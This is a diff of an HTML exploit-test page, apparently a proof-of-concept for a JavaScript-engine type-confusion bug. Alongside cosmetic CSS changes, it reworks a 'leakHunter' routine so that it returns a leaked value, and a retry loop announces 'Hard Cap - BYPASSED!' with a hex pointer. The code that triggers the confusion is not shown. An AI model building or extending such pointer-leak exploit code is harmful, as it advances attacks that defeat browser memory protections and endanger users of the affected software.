@@ -14,14 +14,13 @@
             transition: right 0.5s ease-in-out; box-shadow: 0 5px 15px rgba(0,0,0,0.5);
             z-index: 100;
         }
-        #notification b { color: #00ff00; }
         .btn {
             margin-top: 30px; padding: 15px 30px; background: transparent; 
             border: 2px solid #00ff00; color: #00ff00; cursor: pointer;
             font-weight: bold; font-size: 18px; transition: 0.3s;
         }
         .btn:hover { background: #00ff00; color: #000; box-shadow: 0 0 20px #00ff00; }
-        .btn:disabled { border-color: #555; color: #555; cursor: not-allowed; }
+        .btn:disabled { border-color: #555; color: #555; cursor: not-allowed; box-shadow: none; }
     </style>
 </head>
 <body>
@@ -55,16 +54,16 @@
             }
             let result = confuser.a;
             if (typeof result !== 'object' && typeof result !== 'number') {
-                console.log("[!] We have Type Confusion running successfully on 13.04. " + result);
-                return true;
+                return result;
             }
-            return false;
+            return null;
         }
 
         function runExperiment() {
-            if (leakHunter()) {
+            let result = leakHunter();
+            if (result) {
                 console.log("[!!!] SUCCESS");
-                alert("Success: ");
+                alert("Hard Cap - BYPASSED! Pointer: 0x" + result.toString(16)); 
             } else {
                 setTimeout(runExperiment, 100); 
             }
